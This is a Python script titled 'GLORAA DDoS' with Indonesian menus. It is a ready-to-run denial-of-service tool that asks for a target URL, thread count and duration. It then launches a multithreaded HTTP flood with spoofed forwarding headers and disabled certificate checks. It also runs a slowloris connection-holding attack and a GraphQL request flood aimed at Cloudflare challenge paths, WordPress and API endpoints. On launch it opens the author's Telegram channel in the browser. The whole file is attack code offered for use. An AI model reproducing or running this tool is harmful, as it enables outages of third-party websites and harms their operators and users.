#!/usr/bin/env python3
import requests
import threading
import time
import random
import string
import sys
import urllib3
import socket
import ssl
import struct
import json
import os
import webbrowser
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    print("""
    \033[91m
▄▀▀░ █░░ ▄▀▄ █▀▀▄ ▄▀▄ ▄▀▄
█░▀▌ █░░ █░█ █▐█▀ █▀█ █▀█
▀▀▀░ ▀▀▀ ░▀░ ▀░▀▀ ▀░▀ ▀░▀
                      █▀▄ █▀▄ ▄▀▄ ▄▀▀
                      █░█ █░█ █░█ ░▀▄
                      ▀▀░ ▀▀░ ░▀░ ▀▀░
    \033[0m
    \033[94m╔══════════════════════════════════════╗
    ║           GLORAA DDoS                ║
    ║   Work100% Jngan Lupa Fllow Ch aku   ║
    ║      Developer: t.me/Aylamanjah      ║
    ║     Channel: https://t.me/gloraaya   ║
    ╚══════════════════════════════════════╝\033[0m
    """)

def redirect_to_channel():
    print("\n\033[93m[!] Membuka Channel Telegram...\033[0m")
    print("\033[96m[→] Channel: https://t.me/gloraaya\033[0m")
    time.sleep(2)
    telegram_url = "https://t.me/gloraaya"
    try:
        if os.name == 'posix':
            os.system(f"xdg-open '{telegram_url}'")
        elif os.name == 'nt':
            webbrowser.open(telegram_url)
        elif os.name == 'darwin':
            os.system(f"open '{telegram_url}'")
        else:
            webbrowser.open(telegram_url)
    except:
        pass
    time.sleep(3)
    clear_screen()
    show_banner()

def show_menu():
    print("\n\033[93mPILIHAN MENU:\033[0m")
    print("\033[92m[1] MULAI SERANGAN\033[0m")
    print("\033[92m[2] DEVELOPER\033[0m")
    print("\033[91m[0] KELUAR\033[0m")
    while True:
        try:
            choice = input("\n\033[96mMASUKKAN PILIHAN [0-2]: \033[0m").strip()
            if choice in ['0', '1', '2']:
                return choice
            else:
                print("\033[91m[!] Pilihan tidak valid\033[0m")
        except KeyboardInterrupt:
            sys.exit(0)

def show_developer():
    print("\n\033[94m╔══════════════════════════════════════╗")
    print("║              DEVELOPER              ║")
    print("╠══════════════════════════════════════╣")
    print("║ Nama    : GLORAA DoS Panel          ║")
    print("║ Developer: @Aylamanjah              ║")
    print("║ Channel : https://t.me/gloraaya     ║")
    print("║ Versi   : V1 [Beta] The Powerfull Tools    ║")
    print("╚══════════════════════════════════════╝\033[0m")
    input("\nTekan ENTER untuk kembali...")

class UltimateCFBypass:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.host = target_url.replace('https://', '').replace('http://', '').split('/')[0]
        self.requests_sent = 0
        self.successful_reqs = 0
        self.is_running = True
        
        self.working_endpoints = [
            '/cdn-cgi/challenge-platform/orchestrate/jsch/v1',
            '/cdn-cgi/challenge-platform/orchestrate/chl/api/v1',
            '/cdn-cgi/challenge-platform/h/b/orchestrate/jsch/v1',
            '/cdn-cgi/challenge-platform/h/b/turnstile/v1',
            '/_next/static/chunks/',
            '/_next/data/',
            '/static/js/',
            '/wp-admin/admin-ajax.php',
            '/api/graphql',
            '/graphql',
            '/api/v1/users',
            '/api/v1/auth',
            '/rest/v1/',
            '/ajax.php',
            '/xmlrpc.php'
        ]
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        self.referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://search.yahoo.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/'
        ]

    def generate_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def generate_payload(self):
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        names = ['john', 'jane', 'mike', 'sarah', 'david', 'lisa']
        return {
            "username": f"{random.choice(names)}{random.randint(100,999)}",
            "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
            "email": f"{random.choice(names)}{random.randint(100,999)}@{random.choice(domains)}",
            "query": "query { users { id name email } }"
        }

    def create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def http_flood(self, thread_id):
        session = requests.Session()
        session.verify = False
        
        while self.is_running:
            try:
                endpoint = random.choice(self.working_endpoints)
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Cache-Control': 'max-age=0',
                    'Referer': random.choice(self.referers),
                    'X-Forwarded-For': self.generate_ip(),
                    'X-Real-IP': self.generate_ip(),
                    'X-Client-IP': self.generate_ip()
                }
                
                if random.random() < 0.3:
                    payload = self.generate_payload()
                    response = session.post(
                        f"{self.target}{endpoint}",
                        json=payload,
                        headers=headers,
                        timeout=5
                    )
                else:
                    response = session.get(
                        f"{self.target}{endpoint}",
                        headers=headers,
                        timeout=5,
                        params={'_': int(time.time() * 1000)}
                    )
                
                self.requests_sent += 1
                if response.status_code < 500:
                    self.successful_reqs += 1
                    
                if thread_id == 0 and self.requests_sent % 50 == 0:
                    self.print_stats()
                    
            except:
                self.requests_sent += 1

    def slowloris_attack(self, thread_id):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.host, 443))
                
                context = self.create_ssl_context()
                ssl_sock = context.wrap_socket(s, server_hostname=self.host)
                
                headers = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"X-Forwarded-For: {self.generate_ip()}\r\n"
                )
                
                ssl_sock.send(headers.encode())
                self.requests_sent += 1
                
                while self.is_running:
                    time.sleep(10)
                    ssl_sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    self.requests_sent += 1
                    
            except:
                pass

    def graphql_bomb(self, thread_id):
        session = requests.Session()
        session.verify = False
        
        queries = [
            {'query': 'query { __schema { types { name fields { name } } } }'},
            {'query': 'query { users { id name email posts { id title } } }'},
            {'query': 'mutation { createUser(input: {name: "test", email: "test@test.com"}) { id } }'},
            {'query': 'query { system { version status config } }'}
        ]
        
        while self.is_running:
            try:
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': 'application/json',
                    'X-Forwarded-For': self.generate_ip()
                }
                
                response = session.post(
                    f"{self.target}/graphql",
                    json=random.choice(queries),
                    headers=headers,
                    timeout=5
                )
                
                self.requests_sent += 1
                if response.status_code < 500:
                    self.successful_reqs += 1
                    
            except:
                self.requests_sent += 1

    def print_stats(self):
        print(f"\r\033[94m[GLORAA] Requests: {self.requests_sent} | Success: {self.successful_reqs} | Threads: {threading.active_count()}\033[0m", end='', flush=True)

    def start_attack(self, threads=150, duration=600):
        print(f"\n\033[92m[+] MEMULAI SERANGAN ULTIMATE\033[0m")
        print(f"\033[93m[→] Target: {self.target}\033[0m")
        print(f"\033[93m[→] Threads: {threads}\033[0m")
        print(f"\033[93m[→] Durasi: {duration} detik\033[0m")
        print("\033[94m" + "═" * 60 + "\033[0m")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(int(threads * 0.6)):
                executor.submit(self.http_flood, i)
            
            for i in range(int(threads * 0.2)):
                executor.submit(self.slowloris_attack, i)
            
            for i in range(int(threads * 0.2)):
                executor.submit(self.graphql_bomb, i)
            
            while time.time() - start_time < duration:
                time.sleep(1)
                if not self.is_running:
                    break
        
        self.is_running = False
        print(f"\n\033[92m[✓] SERANGAN SELESAI!\033[0m")
        self.print_stats()
        print()

def start_attack_menu():
    print("\n\033[93m[→] MASUKKAN DETAIL SERANGAN:\033[0m")
    
    target = input("\033[96mMASUKKAN LINK TARGET: \033[0m").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    try:
        threads = int(input("\033[96mMASUKKAN JUMLAH THREADS: \033[0m"))
        duration = int(input("\033[96mMASUKKAN DURASI SERANGAN (detik): \033[0m"))
    except:
        print("\033[91m[!] Input harus angka!\033[0m")
        return
    
    print(f"\n\033[92m[+] KONFIRMASI SERANGAN:\033[0m")
    print(f"\033[93mTarget: {target}\033[0m")
    print(f"\033[93mThreads: {threads}\033[0m")
    print(f"\033[93mDurasi: {duration} detik\033[0m")
    
    confirm = input("\n\033[96mLanjutkan? (y/n): \033[0m").lower()
    if confirm != 'y':
        return
    
    try:
        tool = UltimateCFBypass(target)
        tool.start_attack(threads, duration)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\033[91m[!] Error: {e}\033[0m")

def main():
    redirect_to_channel()
    
    while True:
        clear_screen()
        show_banner()
        choice = show_menu()
        
        if choice == '1':
            start_attack_menu()
        elif choice == '2':
            show_developer()
        elif choice == '0':
            print("\n\033[92m[✓] GLORAA ULTIMATE DDoS\033[0m")
            break
        
        input("\nTekan ENTER untuk melanjutkan...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
